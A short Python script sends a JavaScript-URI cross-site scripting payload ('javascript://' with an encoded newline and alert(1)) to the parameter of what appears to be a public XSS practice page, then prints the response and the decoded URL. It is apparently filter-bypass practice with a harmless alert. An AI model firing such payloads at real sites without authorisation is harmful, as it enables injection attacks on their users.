#!/usr/bin/python3
import requests
import urllib

url = 'https://brutelogic.com.br/gym.php'

payload = '%250Aalert(1)'

value = f'javascript://{payload}//?a'

params = {'p21': value}

r = requests.get(url, params=params)

print(r.text)

a = urllib.parse.unquote(r.url)

print(a)
